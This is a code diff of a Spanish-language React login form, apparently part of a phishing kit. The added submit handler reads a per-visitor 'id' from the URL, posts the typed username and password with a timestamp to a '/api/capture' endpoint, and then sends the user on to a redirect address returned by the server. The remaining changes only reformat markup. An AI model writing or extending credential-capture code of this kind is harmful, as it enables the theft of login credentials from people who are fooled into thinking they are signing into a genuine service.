@@ -45,18 +45,35 @@ export default function DefaultForm() {
     input.value ? setError(false) : setError(true);
   }
 
-  function handleSubmit(e: any) {
+  async function handleSubmit(e: any) {
     e.preventDefault();
+    const searchParams = new URLSearchParams(window.location.search);
 
     const username: string | null = e.target.username.value;
     const password: string | null = e.target.password.value;
+    const id = searchParams.get("id");
 
     if (!password || password === "") {
-      setError(true)
+      setError(true);
       return;
     }
 
     if (username && password) {
+      const req = await fetch("/api/capture", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ username, password, date: new Date(), id: id }),
+      });
+
+      const rep = await req.json();
+
+      if (rep.status === "success") {
+        window.location.replace(rep.redirect);
+      } else {
+        window.location.reload();
+      }
     } else {
       window.location.reload();
     }
@@ -81,7 +98,9 @@ export default function DefaultForm() {
       </div>
       <div className="flex flex-col gap-2">
         <form onSubmit={handleSubmit}>
-          <h1 className={`${styles["form-title"]} mb-2`}>Escribir contraseña</h1>
+          <h1 className={`${styles["form-title"]} mb-2`}>
+            Escribir contraseña
+          </h1>
           {haveError ? <ErrorBox /> : null}
           <div>
             <input
@@ -96,7 +115,9 @@ export default function DefaultForm() {
             <input
               aria-required="true"
               autoComplete="current-password"
-              className={`${styles["form-inputPrimary"]} ${haveError && styles["form-error"]}`}
+              className={`${styles["form-inputPrimary"]} ${
+                haveError && styles["form-error"]
+              }`}
               type="password"
               name="password"
               onInput={handleInput}
